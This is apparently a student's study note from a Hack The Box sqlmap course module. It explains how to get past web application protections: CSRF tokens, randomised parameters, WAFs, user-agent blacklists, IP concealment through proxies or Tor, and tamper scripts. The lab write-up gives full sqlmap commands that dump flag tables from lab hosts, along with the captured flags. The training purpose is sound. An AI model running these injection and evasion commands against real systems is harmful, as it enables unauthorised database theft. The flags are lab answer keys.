---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Bypassing Web Application Protections

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Anti-CSRF Token Bypass

### bypassing anti-CSRF protection

- --csrf-token
  - automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
    - sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
## Unique Value Bypass

### --randomize

- ensuring that each request has a unique value for a predefined parameter
  - sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
    - uri: http://www.example.com:80/?id=1&rp=99954  
      URI:%20http://www.example.com:80/?id=1&rp=87216URI:%20http://www.example.com:80/?id=9030&rp=36456  
      URI:%20http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689  
      URI:%20http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049  
      URI:%20http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
## Calculated Parameter Bypass

### one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one

- --eval
  - sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
## IP Address Concealing

### --proxy

- we can try to use a proxy or the anonymity network Tor.
  - --proxy="socks4://177.39.187.70:33283"
### list of proxies

- --proxy-file
### --tor

- there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.
## WAF Bypass

### SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF

- --skip-waf
### to identify the actual protection mechanism

- SQLMap uses a third-party library identYwaf
  - <https://github.com/stamparm/identYwaf>
  - containing the signatures of 80 different WAF solutions
## User-agent Blacklisting Bypass

### HTTP error code 5XX from the start

- --random-agent
## Tamper Scripts

### Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

- <https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py>
  - replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #
  - equals operator (=) with BETWEEN # AND #
- Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:
  - --list-tampers
    - Tamper-Script	Description  
      0eunion	Replaces instances of UNION with e0UNION  
      base64encode	Base64-encodes all characters in a given payload  
      between	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #  
      commalesslimit	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart  
      equaltolike	Replaces all occurrences of operator equal (=) with LIKE counterpart  
      halfversionedmorekeywords	Adds (MySQL) versioned comment before each keyword  
      modsecurityversioned	Embraces complete query with (MySQL) versioned comment  
      modsecurityzeroversioned	Embraces complete query with (MySQL) zero-versioned comment  
      percentage	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)  
      plus2concat	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart  
      randomcase	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)  
      space2comment	Replaces space character ( ) with comments `/  
      space2dash	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)  
      space2hash	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)  
      space2mssqlblank	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters  
      space2plus	Replaces space character ( ) with plus (+)  
      space2randomblank	Replaces space character ( ) with a random blank character from a valid set of alternate characters  
      symboliclogical	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)  
      versionedkeywords	Encloses each non-function keyword with (MySQL) versioned comment  
      versionedmorekeywords	Encloses each keyword with (MySQL) versioned comment
### Miscellaneous Bypasses

- --chunked
### HTTP parameter pollution (HPP)

- id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).
### --tamper

- --tamper=between,randomcase
## LAB

### What's the contents of table flag8? (Case #8)

- anti-CSRF token bypass
  - copy the POST message as curl
    - sqlmap -u 'http://94.237.61.52:31681/case8.php' \  
      --compressed \  
      -X POST \  
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \  
      --data-raw 'id=1&t0ken=TywHpLRHl4MhhR2LeyHqOU15pldq58ygWjgIhuBw0' --batch --csrf-token="t0ken" -p id
      - sqlmap -u 'http://94.237.61.52:31681/case8.php' \  
        --compressed \  
        -X POST \  
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \  
        --data-raw 'id=1&t0ken=TywHpLRHl4MhhR2LeyHqOU15pldq58ygWjgIhuBw0' --batch --csrf-token="t0ken" -p id -D testdb -T flag8 --dump
        - HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
### What's the contents of table flag9? (Case #9)

- Unique ID
  - sqlmap -u 'http://94.237.61.52:31681/case9.php?id=1&uid=3097251142' --batch -p id  --randomize=uid
    - sqlmap -u 'http://94.237.61.52:31681/case9.php?id=1&uid=3097251142' --batch --randomize=uid -D testdb -T flag9 --dump
      - HTB{700_much_r4nd0mn355_f0r_my_74573}
### What's the contents of table flag10? (Case #10)

- Primitive protection
  - copy the POST message as curl
    - sqlmap -u 'http://94.237.61.52:31681/case10.php' \  
      --compressed \  
      -X POST \  
      ...  
      -H 'Priority: u=0, i' \  
      --data-raw 'id=1' --batch --skip-waf -D testdb -T flag10 --dump
      - HTB{y37_4n07h3r_r4nd0m1z3}
### What's the contents of table flag11? (Case #11)

- Filtering of characters '<', '>'
  - sqlmap -u 'http://94.237.61.52:31681/case11.php?id=1' --batch --tamper=between,randomcase --batch -D testdb -T flag11 --dump
    - HTB{5p3c14l_ch4r5_n0_m0r3}
